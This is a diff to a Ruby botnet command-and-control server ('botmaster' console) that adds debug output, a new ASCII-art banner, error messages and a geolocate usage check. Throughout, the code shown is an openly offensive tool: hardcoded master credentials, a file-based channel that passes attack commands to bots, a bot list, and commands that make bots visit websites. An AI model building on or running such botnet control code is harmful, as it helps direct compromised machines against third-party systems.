@@ -7,6 +7,13 @@ uname = 'botmaster'    # Change this
 password = 'ilovedogs' # Change this
 cmd = ''
 
+def debug(msg='')
+  if ARGV.include?('DEBUG')
+    ind = '[!] '.colorize(:yellow)
+    puts "#{ind}#{msg}"
+  end
+end
+
 
 def writeCmd(command)
   cmdf = File.new("cmd.txt", 'w')
@@ -52,12 +59,19 @@ loop do
     end
     print_good("Master login successful!")
     master.print "
-███████╗     ██████╗     ██████╗      █████╗
-██╔════╝    ██╔═══██╗    ██╔══██╗    ██╔══██╗
-███████╗    ██║   ██║    ██████╔╝    ███████║
-╚════██║    ██║   ██║    ██╔══██╗    ██╔══██║
-███████║    ╚██████╔╝    ██║  ██║    ██║  ██║
-╚══════╝     ╚═════╝     ╚═╝  ╚═╝    ╚═╝  ╚═╝
+    ___ __
+  _{___{__}\\
+ {_}      `\\)
+{_}        `            _.-''''--.._
+{_}                    //'.--.  \\___`.
+ { }__,_.--~~~-~~~-~~-::.---. `-.\\  `.)
+  `-.{_{_{_{_{_{_{_{_//  -- 8;=- `
+     `-:,_.:,_:,_:,.`\\\\._ ..'=- ,
+         // // // //`-.`\\`   .-'/
+        << << << <<    \\ `--'  /----)
+         ^  ^  ^  ^     `-.....--'''
+  Stings like a motherfucker doesn't it.
+
 ".colorize(:red)
 
     master.puts "Made with <3 by AM-77\n\n"
@@ -69,9 +83,10 @@ loop do
         begin
          cmd = cmd.strip!
         rescue NoMethodError => nme # Prevents crash if client quits with CRTL+C
+          print_err("Master disconnected")
           next
         end
-        puts "Master command recieved: #{cmd}"  # prints to main server
+        debug("Master command recieved: #{cmd}")  # prints to main server
         split = cmd.split(' ')
 
         if cmd == "help" || cmd == '?'
@@ -84,6 +99,7 @@ loop do
           master.puts "visit <website>                           Have bots visit a website"
           master.puts
           master.puts "current                                   Shows the current command the bots are reading"
+          master.puts "geolocate <ip>                            Show the location of a given IP"
           master.puts
           master.puts "clear                                     Clear bot command (always do this after an attack command)"
           master.puts "exit                                      Exit the botmaster interface"
@@ -96,7 +112,7 @@ loop do
           if checkAttackCmd(cmd, master)
             writeCmd(cmd)
           else
-            master.puts "\033[31m Unknown command: #{cmd}\033[0m"
+            sprint_err("\033[31m Unknown command: #{cmd}\033[0m", master)
           end
         elsif cmd == "current"
           current_cmd = File.open("cmd.txt", 'r').read
@@ -113,14 +129,20 @@ loop do
           botlist = File.open("bots.txt", 'r')
           master.puts botlist.read
         elsif cmd.include? "geolocate"
-          geolocate(cmd.split(" ")[1], master)
+          parsed = cmd.split(" ")
+          if parsed.length == 2
+            master.puts geolocate(parsed[1])
+          else
+            master.puts "Usage: geolocate <ip>"
+          end
         elsif cmd == 'killall'
           system('pkill ruby')
           exit
         elsif cmd.include? "visit" && split.length == 2
+          sprint_status("Telling bots to visit #{split[1]}", master)
           writeCmd(cmd)
         else
-          master.puts "\033[31m Unknown command: #{cmd}\033[0m"
+          sprint_err("\033[31m Unknown command: #{cmd}\033[0m", master)
         end
 
       rescue Errno::EPROTOTYPE
@@ -136,4 +158,6 @@ loop do
 
   next
 
-end end
+end
+print_err("Master disconnected")
+end
